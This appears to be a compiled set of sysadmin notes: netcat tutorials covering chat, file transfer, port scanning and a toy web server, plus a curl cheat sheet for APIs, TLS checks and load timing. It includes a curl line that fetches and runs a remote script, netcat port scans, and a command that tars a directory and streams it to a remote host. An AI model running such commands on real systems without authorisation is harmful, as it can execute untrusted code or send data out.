# netstat -a | grep -i rdm
tcp        0      0 *:irdmi                     *:*                         LISTEN      

		9.4.4 8 Practical Linux Netcat NC Command Examples

			9.4.4.1 Netcat in a Server-Client Architecture

The netcat utility can be run in the server mode on a specified port listening for incoming connections.

$ nc -l 2389
Also, it can be used in client mode trying to connect on the port(2389) just opened

$ nc localhost 2389
Now, if we write some text at the client side, it reaches the server side. Here is the proof :

$ nc localhost 2389
HI, server
On the terminal where server is running :


 
$ nc -l 2389
HI, server
So we see that netcat utility can be used in the client server socket communication.

			9.4.4.2 Use Netcat to Transfer Files

The netcat utility can also be used to transfer files. At the client side, suppose we have a file named ‘testfile’ containing :

$ cat testfile
hello test
and at the server side we have an empty file ‘test’

Now, we run the server as :

$ nc -l 2389 > test
and run the client as :

cat testfile | nc localhost 2389
Now, when we see the ‘test’ file at the server end, we see :

$ cat test
hello test
So we see that the file data was transfered from client to server.

			9.4.4.3 Netcat Supports Timeouts

There are cases when we do not want a connection to remain open forever. In that case, through ‘-w’ switch we can specify the timeout in a connection. So after the seconds specified along with -w flag, the connection between the client and server is terminated.

Server :

nc -l 2389
Client :

$ nc -w 10 localhost 2389
The connection above would be terminated after 10 seconds.

NOTE : Do not use the -w flag with -l flag at the server side as in that case -w flag causes no effect and hence the connection remains open forever.

			9.4.4.4 Netcat Supports IPV6 Connectivity

The flag -4 or -6 specifies that netcat utility should use which type of addresses. -4 forces nc to use IPV4 address while -6 forces nc to use IPV6 address.

Server :

$ nc -4 -l 2389
Client :

$ nc -4 localhost 2389
Now, if we run the netstat command, we see :

$ netstat | grep 2389
tcp        0      0 localhost:2389          localhost:50851         ESTABLISHED
tcp        0      0 localhost:50851         localhost:2389          ESTABLISHED
The first field in the above output would contain a postfix ‘6’ in case the IPV6 addresses are being used. Since in this case it is not, so a connection between server and client is established using IPV4 addresses.

Now, If we force nc to use IPV6 addresses

Server :

$ nc -6 -l 2389
Client :

$ nc -6 localhost 2389
Now, if we run the netstat command, we see :

$ netstat | grep 2389
tcp6       0      0 localhost:2389          localhost:33234         ESTABLISHED
tcp6       0      0 localhost:33234         localhost:2389          ESTABLISHED
So now a postfix ‘6’ with ‘tcp’ shows that nc is now using IPV6 addresses.

			9.4.4.5 Disable Reading from STDIN in Netcat

This functionality can be achieved by using the flag -d. In the following example, we used this flag at the client side.

Server :

$ nc -l 2389
Client :

$ nc -d localhost 2389
Hi
The text ‘Hi’ will not be sent to the server end as using -d option the read from stdin has been disabled.

			9.4.4.6 Force Netcat Server to Stay Up

If the netcat client is connected to the server and then after sometime the client is disconnected then normally netcat server also terminates.

Server :

$ nc -l 2389
Client :

$ nc localhost 2389
^C
Server :

$ nc -l 2389
$
So, in the above example we see that as soon as the client got disconnected the server was also terminated.

This behavior can be controlled by using the -k flag at the server side to force the server to stay up even after the client has disconnected.

Server :

$ nc -k -l 2389
Client :

$ nc localhost 2389
^C
Server :

$ nc -k -l 2389
So we see that by using the -k option the server remains up even if the client got disconnected.

			9.4.4.7 Configure Netcat Client to Stay Up after EOF

Netcat client can be configured to stay up after EOF is received. In a normal scenario, if the nc client receives an EOF character then it terminates immediately but this behavior can also be controlled if the -q flag is used. This flag expects a number which depicts number of seconds to wait before client terminates (after receiving EOF)

Client should be started like :

nc  -q 5  localhost 2389
Now if the client ever receives an EOF then it will wait for 5 seconds before terminating.

			9.4.4.8 Use Netcat with UDP Protocol

By default all the sockets that nc utility creates are TCP protocols but this utility also works with UDP protocol. To enable UDP protocol the -u flag is used.

Server :

$ nc -4 -u -l 2389
Client :

$ nc -4 -u localhost 2389
Now, both the server and client are configured to use UDP protocol. This can be confirmed by the following netstat command. So we see that this connection is now using the UDP protocol.

$ netstat | grep 2389
udp        0      0 localhost:42634         localhost:2389          ESTABLISHED
		9.4.5 How To Use Netcat to Establish and Test TCP and UDP Connections on a VPS
Feb 19, 2014  Networking, System Tools
Introduction

Linux is known for having a great number of mature, useful command line utilities available out of the box in most distributions. Skilled system administrators can do much of their work using the built-in tools without having to install additional software.

In this guide, we will discuss how to use the netcat utility. Often referred to as a Swiss army knife of networking tools, this versatile command can assist you in monitoring, testing, and sending data across network connections.

We will be exploring this on an Ubuntu 12.04 VPS, but netcat should be available on almost any modern Linux distribution. Ubuntu ships with the BSD variant of netcat, and this is what we will be using in this guide. Other versions may operate differently or provide other options.

General Syntax
By default, netcat operates by initiating a TCP connection to a remote host.

The most basic syntax is:

netcat [options] host port
This will attempt to initiate a TCP to the defined host on the port number specified. This is basically functions similarly to the old Linux telnet command. Keep in mind that your connection is entirely unencrypted.

If you would like to send a UDP packet instead of initiating a TCP connection, you can use the -u option:

netcat -u host port
You can specify a range of ports by placing a dash between the first and last:

netcat host startport-endport
This is generally used with some additional flags.

On most systems, we can use either netcat or nc interchangeably. They are aliases for the same command.

			9.4.5.1 How To Use Netcat for Port Scanning
One of the most common uses for netcat is as a port scanner.

Although netcat is probably not the most sophisticated tool for the job (nmap is a better choice in most cases), it can perform simple port scans to identify open ports easily.

We do this by specifying a range of ports to scan, as we did above, along with the -z option to perform a scan instead of attempting to initiate a connection.

For instance, we can scan all ports up to 1000 by issuing this command:

netcat -z -v domain.com 1-1000
Along with the -z option, we have also specified the -v option to tell netcat to provide more verbose information.

The output will look like this:

nc: connect to domain.com port 1 (tcp) failed: Connection refused
nc: connect to domain.com port 2 (tcp) failed: Connection refused
nc: connect to domain.com port 3 (tcp) failed: Connection refused
nc: connect to domain.com port 4 (tcp) failed: Connection refused
nc: connect to domain.com port 5 (tcp) failed: Connection refused
nc: connect to domain.com port 6 (tcp) failed: Connection refused
nc: connect to domain.com port 7 (tcp) failed: Connection refused
. . .
Connection to domain.com 22 port [tcp/ssh] succeeded!
. . .
As you can see, this provides a lot of information and will tell you for each port whether a scan was successful or not.

If you are actually using a domain name, this is the form you will have to use.

However, your scan will go much faster if you know the IP address that you need. You can then use the -n flag to specify that you do not need to resolve the IP address using DNS:

netcat -z -n -v 111.111.111.111 1-1000
The messages returned are actually sent to standard error (see our I/O redirection article for more info). We can send the standard error messages to standard out, which will allow us to filter the results easier.

We will redirect standard error to standard output using the 2>&1 bash syntax. We will then filter the results with grep:

netcat -z -n -v 111.111.111.111 1-1000 2>&1 | grep succeeded

Connection to 111.111.111.111 22 port [tcp/*] succeeded!
Here, we can see that the only port open in the range of 1-1000 on the remote computer is port 22, the traditional SSH port.

			9.4.5.2 How To Communicate through Netcat
Netcat is not restricted to sending TCP and UDP packets. It also can listen on a port for connections and packets. This gives us the opportunity to connect two instances of netcat in a client-server relationship.

Which computer is the server and which is the client is only a relevant distinction during the initial configuration. After the connection is established, communication is exactly the same in both directions.

On one machine, you can tell netcat to listen to a specific port for connections. We can do this by providing the -l parameter and choosing a port:

netcat -l 4444
This will tell netcat to listen for TCP connections on port 4444. As a regular (non-root) user, you will not be able to open any ports under 1000, as a security measure.

On a second server, we can connect to the first machine on the port number we choose. We do this the same way we've been establishing connections previously:

netcat domain.com 4444
It will look as if nothing has happened. However, you can now send messages on either side of the connection and they will be seen on either end.

Type a message and press ENTER. It will appear on both the local and remote screen. This works in the opposite direction as well.

When you are finished passing messages, you can press CTRL-D to close the TCP connection.

			9.4.5.3 How To Send Files through Netcat
Building off of the previous example, we can accomplish more useful tasks.

Because we are establishing a regular TCP connection, we can transmit just about any kind of information over that connection. It is not limited to chat messages that are typed in by a user. We can use this knowledge to turn netcat into a file transfer program.

Once again, we need to choose one end of the connection to listen for connections. However, instead of printing information onto the screen, as we did in the last example, we will place all of the information straight into a file:

netcat -l 4444 > received_file
On the second computer, create a simple text file by typing:

echo "Hello, this is a file" > original_file
We can now use this file as an input for the netcat connection we will establish to the listening computer. The file will be transmitted just as if we had typed it interactively:

netcat domain.com 4444 < original_file
We can see on the computer that was awaiting a connection, that we now have a new file called "received_file" with the contents of the file we typed on the other computer:

cat received_file
Hello, this is a file
As you can see, by piping things, we can easily take advantage of this connection to transfer all kinds of things.

For instance, we can transfer the contents of an entire directory by creating an unnamed tarball on-the-fly, transferring it to the remote system, and unpacking it into the remote directory.

On the receiving end, we can anticipate a file coming over that will need to be unzipped and extracted by typing:

netcat -l 4444 | tar xzvf -
The ending dash (-) means that tar will operate on standard input, which is being piped from netcat across the network when a connection is made.

On the side with the directory contents we want to transfer, we can pack them into a tarball and then send them to the remote computer through netcat:

tar -czf - * | netcat domain.com 4444
This time, the dash in the tar command means to tar and zip the contents of the current directory (as specified by the * wildcard), and write the result to standard output.

This is then written directly to the TCP connection, which is then received at the other end and decompressed into the current directory of the remote computer.

This is just one example of transferring more complex data from one computer to another. Another common idea is to use the dd command to image a disk on one side and transfer it to a remote computer. We won't be covering this here though.

			9.4.5.4 How To Use Netcat as a Simple Web Server
We've been configuring netcat to listen for connections in order to communicate and transfer files. We can use this same concept to operate netcat as a very simple web server. This can be useful for testing pages that you are creating.

First, let's make a simple HTML file on one server:

nano index.html
Here is some simple HTML that you can use in your file:

<html>
        <head>
                <title>Test Page</title>
        </head>
        <body>
                <h1>Level 1 header</h1>
                <h2>Subheading</h2>
                <p>Normal text here</p>
        </body>
</html>
Save and close the file.

Without root privileges, you cannot serve this file on the default web port, port 80. We can choose port 8888 as a regular user.

If you just want to serve one page, one time to check how it renders, you can type something like this:

netcat -l 8888 < index.html
Now, in your browser, you can access the content by visiting:

http://server_IP:8888
netcat page served

This will serve the page, and then the netcat connection will close. If you attempt to refresh the page, it will be gone:

netcat page gone

We can have netcat serve the page indefinitely by wrapping the last command in an infinite loop, like this:

while true; do nc -l 8888 < index.html; done
This will allow it to continue to receive connections after the first connection closes.

We can stop the loop by typing CTRL-C on the server.

This allows you to see how a page renders in a browser, but it doesn't provide much more functionality. You should never use this for serving actual websites. There is no security and simple things like links do not even work correctly.

Conclusion
You should now have a pretty good idea as to what netcat can be used for. It is a versatile tool that can be useful to diagnose problems and verify that base-level functionality is working correctly with TCP/UDP connections.

Using netcat, you can communicate between different computers very easily for quick interactions. Netcat attempts to make network interactions transparent between computers by taking the complexity out of forming connections.

By Justin Ellingwood
		9.4.6 
	9.5 curl

	    9.5.1 cheat-sheet
curl cheat sheet

* XML GET
```bash
curl -H "Accept: application/xml" -H "Content-Type: application/xml" -X GET "http://hostname/resource"
```
* JSON GET
```bash
curl -i -H "Accept: application/json" -H "Content-Type: application/json" -X GET "http://hostname/resource"
```
* JSON PUT
```bash
curl -i -H 'Content-Type: application/json' -H 'Accept: application/json' -X PUT -d '{"updated_field1":"updated_value1"}' "http://hostname/resourcex"
```
* JSON POST uploading a file
```bash
curl -i -H 'Accept: application/json' -X POST -F "filename=@/file/path" -F "other_field=its_value"   "http://hostname/resource"
```
* JSON DELETE
```bash
curl -i -H 'Content-Type: application/json' -H 'Accept: application/json' -X DELETE -d '{"key1":"value1"}' "http://hostname/resource"
```
* "Debugging mode" (without actual content output):
```bash
curl -XGET -vvv http://hostname/resource > dev\null
```

### Useful arguments
* ```-k```: not check SSL certificates
* ```-L```: follow redirects
* ```-v```: get verbose output
* ```-V```: get headers at output


cURL Cheat Sheet
Curl is the swiss army knife for gathering information while troubleshooting websites. There are many ways to use curl and this guide is simply documenting the ones I often use, but can never seem to remember the specific flags.
General Usage
Test a page behind a username/password prompt:
[user@workstation01 ~]# curl --user name:password http://www.example.com
Download files from github:
[user@workstation01 ~]# curl -O https://raw.github.com/username/reponame/master/filename
Download content via curl to a specific filename:
[user@workstation01 ~]# curl -o archive.tgz https://www.example.com/file.tgz
Run a script from a remote source on server. Understand the security implications of doing this as it can be dangerous!
[user@workstation01 ~]# source <( curl -sL https://www.example.com/your_script.sh)
Website Troubleshooting
Receive output detailing the HTTP response and request headers, following all redirects, and discarding the page body:
[user@workstation01 ~]# curl -Lsvo /dev/null https://www.example.com
Test a domain hosted on the local server, bypassing DNS:
[user@workstation01 ~]# curl -sLH "host: www.example.com" localhost
Test a domain against specific IP, bypassing the need for modifying /etc/hosts:
[user@workstation01 ~]# curl -Lsvo /dev/null --resolve 'example.com:443:123.123.123.123' https://www.example.com/

or

[user@workstation01 ~]# curl -Lsvo /dev/null --header "Host: example.com" https://123.123.123.123/
Send request using a specific user-agent. Sometimes a server will have rules in place to block the default curl user-agent string. Or perhaps you need to test using a specific user-agent. You can pass specific user-agent strings by running:
[user@workstation01 ~]# curl --user-agent "USER_AGENT_STRING_HERE" www.example.com
A comprehensive listing of available user-agent strings available resides at:
http://www.useragentstring.com/pages/useragentstring.php
For example, lets say you need to test a mobile device user-agent to see if a custom redirect works:
[user@workstation01 ~]# curl -H "User-Agent: Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19" -IL http://www.example.com/about/contact-us

HTTP/1.1 301 Moved Permanently
Date: Tue, 17 Nov 2015 18:10:09 GMT
Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.1e-fips
Location: http://www.example.com/mobi/contact.php
Content-Type: text/html; charset=iso-8859-1
````

#### SSL/TLS Testing

SSL 2.0, SSL 3.0, TLS 1.0 and TLS 1.1 are all prohibited (RFC 6176, RFC 7568, RFC 8996), and current curl treats `--sslv2`/`--sslv3` as no-ops, so testing them with curl is pointless; a server today should offer only TLS 1.2 and TLS 1.3.[^rfc-8996]

In current curl `--tlsv1.X` sets the *minimum* version, so to check whether a server supports exactly one version, pin the maximum too with `--tls-max`:[^curl-tlsv12]

```bash
# Does the server accept TLS 1.2? (min 1.2, max 1.2)
curl -sSI --tlsv1.2 --tls-max 1.2 https://www.example.com -o /dev/null && echo "TLS 1.2 OK"

# Does the server accept TLS 1.3?
curl -sSI --tlsv1.3 https://www.example.com -o /dev/null && echo "TLS 1.3 OK"

# Make sure legacy TLS 1.0/1.1 are refused (expect a handshake failure;
# your local OpenSSL may also refuse them at its default security level)
curl -sSI --tlsv1.0 --tls-max 1.1 https://www.example.com -o /dev/null || echo "legacy TLS refused"

# Same checks with openssl
openssl s_client -connect www.example.com:443 -servername www.example.com -tls1_2 </dev/null
openssl s_client -connect www.example.com:443 -servername www.example.com -tls1_3 </dev/null
```

````text
Performance Troubleshooting
Load times can be impacted by a number of things, such as the TLS handshake, DNS lookup time, redirects, transfers, upload/downloads, etc. The curl command shown below will break down the times for each accordingly:
[user@workstation01 ~]# curl -Lsvo /dev/null https://www.example.com/ -w "\nContent Type: %{content_type} \
\nHTTP Code: %{http_code} \
\nHTTP Connect:%{http_connect} \
\nNumber Connects: %{num_connects} \
\nNumber Redirects: %{num_redirects} \
\nRedirect URL: %{redirect_url} \
\nSize Download: %{size_download} \
\nSize Upload: %{size_upload} \
\nSSL Verify: %{ssl_verify_result} \
\nTime Handshake: %{time_appconnect} \
\nTime Connect: %{time_connect} \
\nName Lookup Time: %{time_namelookup} \
\nTime Pretransfer: %{time_pretransfer} \
\nTime Redirect: %{time_redirect} \
\nTime Start Transfer (TTFB): %{time_starttransfer} \
\nTime Total: %{time_total} \
\nEffective URL: %{url_effective}\n" 2>&1
The example output is below:
...
HTTP Code: 200 
HTTP Connect:000 
Number Connects: 2 
Number Redirects: 1 
Redirect URL:  
Size Download: 136112 
Size Upload: 0 
SSL Verify: 0 
Time Handshake: 0.689 
Time Connect: 0.556 
Name Lookup Time: 0.528 
Time Pretransfer: 0.689 
Time Redirect: 0.121 
Time Start Transfer (TTFB): 0.738 
Time Total: 0.962 
Effective URL: https://www.example.com/
Another example for quickly seeing performance is below. For simplicity purposes, first create a file with our curl options already in it:
[user@workstation01 ~]# vim site-performance.cfg
\n
      DNS lookup                          :  %{time_namelookup}\n
      Connect to server (TCP)             :  %{time_connect}\n
      Connect to server (HTTP/S)          :  %{time_appconnect}\n
      Time from start until transfer began:  %{time_pretransfer}\n
      Time for redirection (if any)       :  %{time_redirect}\n
      Total time before transfer started  :  %{time_starttransfer}\n
\n
             Total time                   :  %{time_total}\n
             Size of download (bytes)     :  %{size_download}\n
             Average d/l speed (bytes/s)  :  %{speed_download}\n
\n
Then run it:
[user@workstation01 ~]# curl -w "@site-performance.cfg" -o /dev/null -s https://www.example.com
      DNS lookup                          :  0.138664
      Connect to server (TCP)             :  0.171131
      Connect to server (HTTP/S)          :  0.268969
      Time from start until transfer began:  0.269021
      Time for redirection (if any)       :  0.000000
      Total time before transfer started  :  0.532772

             Total time                   :  0.628730
             Size of download (bytes)     :  162510
             Average d/l speed (bytes/s)  :  258473.000
If a web server is running a bunch of sites and has a high load, how can you narrow down which site is likely causing the high load condition on the server? One way would be to see which site takes the longest to load, as that may indicate a resource intensive site. See the example below:
[user@workstation01 ~]# for i in www.example1.com www.example2.com www.example3.com; do echo -n "$i "; (time curl -IL $i -XGET) 2>&1 | grep -E "real|HTTP"; echo; done

www.example1.com HTTP/1.1 200 OK
real	0m0.642s

www.example2.com HTTP/1.1 200 OK
real	0m2.234s

www.example3.com HTTP/1.1 200 OK
real	0m0.421s
So www.example2.com takes 2 seconds to load. What happens to the load times on that domain during increased traffic. The example below will send 25 requests to the domain:
[user@workstation01 ~]# for i in {1..25}; do (time curl -sIL http://www.example2.com -X GET &) 2>&1 | grep -E "real|HTTP" & done

HTTP/1.1 200 OK
real	0m11.297s
HTTP/1.1 200 OK
real	0m11.395s
HTTP/1.1 200 OK
real	0m11.906s
HTTP/1.1 200 OK
real	0m12.079s
...
HTTP/1.1 200 OK
real	0m11.297s
Determining why this is happening will involve investigation outside the scope of this article. Mainly around investigating ways to cache the site or otherwise optimizing it. However at least now we know which site doesn’t perform well under increased requests, and may be causing the high server load.


￼

￼

	    9.5.2 SAP CP
[employer-specific content moved to private KB, 2026-10]
	    9.5.3


	9.6 tcpdump

        9.7 
````

[^rfc-8996]: RFC 8996: Deprecating TLS 1.0 and TLS 1.1
[^curl-tlsv12]: curl man page (--tlsv1.2, --tlsv1.3, --tls-max, --sslv3)
[^ip-8]: ip(8) - Linux manual page
